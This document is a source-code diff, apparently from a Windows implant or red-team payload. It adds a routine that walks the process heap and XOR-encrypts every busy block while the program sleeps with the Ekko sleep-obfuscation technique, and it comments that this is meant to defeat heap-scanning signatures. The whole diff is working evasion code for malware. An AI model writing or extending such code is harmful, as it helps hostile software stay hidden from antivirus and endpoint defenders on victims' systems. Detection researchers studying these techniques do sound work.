@@ -143,6 +143,41 @@ static VOID CALLBACK _ekko_wake(PVOID ctx, BOOLEAN fired) {
     SetEvent(c->hEvent);
 }
 
+/* ── Heap block encryption helpers ────────────────────────────────────────
+ *
+ * XOR-encrypts every live heap block with a per-block key derived from
+ * the block address, preventing heap-scanning signatures during sleep.
+ */
+static VOID _xor_heap_block(PVOID pBlock, SIZE_T size, BYTE key) {
+    BYTE *p = (BYTE *)pBlock;
+    for (SIZE_T i = 0; i < size; i++)
+        p[i] ^= (key ^ (BYTE)(i & 0xFF));
+}
+
+static VOID _process_heap(BOOL encrypt) {
+    HANDLE hHeap = GetProcessHeap();
+    if (!hHeap) return;
+
+    if (!HeapLock(hHeap)) return;
+
+    PROCESS_HEAP_ENTRY entry = {0};
+    while (HeapWalk(hHeap, &entry)) {
+        if (!(entry.wFlags & PROCESS_HEAP_ENTRY_BUSY)) continue;
+        if (entry.cbData < 8) continue;           /* skip tiny blocks */
+        BYTE key = (BYTE)((ULONG_PTR)entry.lpData >> 4);
+        _xor_heap_block(entry.lpData, entry.cbData, key);
+    }
+
+    HeapUnlock(hHeap);
+}
+
+/* HeapEncryptedSleep — Ekko sleep + heap encryption during rest */
+VOID HeapEncryptedSleep(DWORD dwMilliseconds) {
+    _process_heap(TRUE);         /* encrypt heap blocks */
+    AdvancedEkkoSleep(dwMilliseconds);
+    _process_heap(FALSE);        /* decrypt heap blocks (XOR is symmetric) */
+}
+
 VOID AdvancedEkkoSleep(DWORD dwMilliseconds) {
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     if (!hNtdll) { ObfuscatedSleep(dwMilliseconds); return; }
